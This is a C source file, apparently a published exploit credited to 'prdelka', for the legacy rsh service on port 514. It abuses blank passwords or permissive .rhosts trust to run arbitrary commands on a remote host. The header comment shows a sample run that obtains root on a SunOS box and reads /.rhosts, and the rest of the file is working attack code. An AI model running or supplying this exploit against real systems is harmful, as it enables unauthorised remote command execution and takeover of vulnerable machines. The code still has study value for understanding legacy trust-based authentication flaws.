/* rshx.c
 * ======
 * little exploit for exploiting rsh (514/tcp) with blank passwords
 * or bad .rhosts files, you need root to run this code as you must 
 * open a privileged src port to connect. I came across an old SunOS
 * box that was vulnerable to this issue with scanners in nessus & 
 * metasploit and needed an exploit.
 *
 *  C:\nessus> nasl.exe -t 123.123.123.123 plugins\rsh_users.nasl
 *  rsh_users.nasl: Success
 *
 *  Example.
 *
 *  # ./rshx 123.123.123.123 root "id;uname -a;cat /.rhosts"
 *  uid=0(root) gid=0(root)
 *  SunOS dumdum 5.8 Generic_117350-61 sun4u sparc SUNW,Sun-Fire-V240
 *  + +
 *  #
 *
 *  -- prdelka
 */
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int main (int argc, char *argv[]) {
    int ret, fd, length;
    fd_set readfds;
    struct sockaddr_in sa_dst;
    struct sockaddr_in sa_loc;
    char* buffer = malloc(65535);

    if(argc < 4){
        printf("Use with <host> <username> \"command\"\n");
        exit(0);
    }
    if(getuid()!=0){
        printf("You should be root to run this\n");
        exit(0);
    }
    fd = socket(AF_INET, SOCK_STREAM, 0);

    memset(&sa_loc, 0, sizeof(struct sockaddr_in));
    sa_loc.sin_family = AF_INET;
    sa_loc.sin_port = htons(1023);
    sa_loc.sin_addr.s_addr = inet_addr("0.0.0.0");

    ret = bind(fd, (struct sockaddr *)&sa_loc, sizeof(struct sockaddr));

    memset(&sa_dst, 0, sizeof(struct sockaddr_in));
    sa_dst.sin_family = AF_INET;
    sa_dst.sin_port = htons(514);
    sa_dst.sin_addr.s_addr = inet_addr(argv[1]);

    ret = connect(fd, (struct sockaddr *)&sa_dst, sizeof(struct sockaddr));

    send(fd, "\x00",1,0);
    send(fd, argv[2], strlen(argv[2]),0);
    send(fd, "\x00",1,0);
    send(fd, argv[2], strlen(argv[2]),0);
    send(fd, "\x00",1,0);
    send(fd, argv[3],strlen(argv[3]),0);
    send(fd, "\x00",1,0);
    ret = recv(fd, buffer, 1, 0);

    while(ret) {
        ret = recv(fd, buffer, 65534, 0);
        printf("%s",buffer);
        memset(buffer,0,65535);
    }
}

